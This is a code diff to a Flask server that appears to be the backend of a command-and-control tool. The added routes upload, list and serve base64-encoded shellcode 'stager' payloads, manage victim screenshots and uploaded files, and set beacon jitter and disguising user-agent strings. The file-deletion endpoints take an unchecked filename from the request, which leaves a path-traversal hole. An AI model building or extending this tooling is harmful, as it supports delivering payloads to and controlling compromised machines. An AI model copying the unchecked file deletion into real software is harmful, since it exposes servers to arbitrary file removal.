@@ -87,10 +87,89 @@ def get_upload(filename):
 def get_screenshot(filename):
     return send_from_directory(SCREENSHOT_FOLDER, filename)
 
+@app.route('/api/files')
+def api_files():
+    files = [f for f in os.listdir(UPLOAD_FOLDER) if os.path.isfile(os.path.join(UPLOAD_FOLDER, f))]
+    return jsonify(files)
+
+@app.route('/api/screenshots')
+def api_screenshots():
+    shots = [f for f in os.listdir(SCREENSHOT_FOLDER) if os.path.isfile(os.path.join(SCREENSHOT_FOLDER, f))]
+    return jsonify(shots)
+
+@app.route('/api/upload_file', methods=['POST'])
+def upload_file():
+    file = request.files.get('file')
+    if not file or not file.filename:
+        return jsonify({'error': 'No file uploaded'}), 400
+    filename = secure_filename(file.filename)
+    file.save(os.path.join(UPLOAD_FOLDER, filename))
+    return jsonify({'success': True, 'filename': filename})
+
+@app.route('/api/delete_file', methods=['POST'])
+def delete_file():
+    filename = request.json.get('filename')
+    path = os.path.join(UPLOAD_FOLDER, filename)
+    if os.path.exists(path):
+        os.remove(path)
+        return jsonify({'success': True})
+    return jsonify({'error': 'File not found'}), 404
+
+@app.route('/api/delete_screenshot', methods=['POST'])
+def delete_screenshot():
+    filename = request.json.get('filename')
+    path = os.path.join(SCREENSHOT_FOLDER, filename)
+    if os.path.exists(path):
+        os.remove(path)
+        return jsonify({'success': True})
+    return jsonify({'error': 'Screenshot not found'}), 404
+
+# Stager payload management
+STAGER_PAYLOADS = {}
+
+@app.route('/api/stager_upload', methods=['POST'])
+def stager_upload():
+    file = request.files.get('payload')
+    if not file or not file.filename:
+        return jsonify({'error': 'No payload uploaded'}), 400
+    name = secure_filename(file.filename)
+    STAGER_PAYLOADS[name] = file.read()
+    return jsonify({'success': True, 'name': name})
+
+@app.route('/api/stager_list')
+def stager_list():
+    return jsonify(list(STAGER_PAYLOADS.keys()))
+
+@app.route('/api/stager_delete', methods=['POST'])
+def stager_delete():
+    name = request.json.get('name')
+    if name in STAGER_PAYLOADS:
+        del STAGER_PAYLOADS[name]
+        return jsonify({'success': True})
+    return jsonify({'error': 'Payload not found'}), 404
+
 @app.route('/api/stager', methods=['GET'])
-def stager():
-    # Return shellcode payload (base64)
+def get_stager():
+    name = request.args.get('name')
+    if name and name in STAGER_PAYLOADS:
+        return base64.b64encode(STAGER_PAYLOADS[name])
+    # fallback to default
     return base64.b64encode(STAGER_PAYLOAD)
+
+settings = {'jitter_min': 10, 'jitter_max': 30, 'user_agents': [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
+    "curl/7.55.1"
+]}
+
+@app.route('/api/settings', methods=['GET', 'POST'])
+def api_settings():
+    global settings
+    if request.method == 'POST':
+        data = request.json
+        settings.update(data)
+        return jsonify(settings)
+    return jsonify(settings)
 
 @app.route('/api/agents')
 def api_agents():
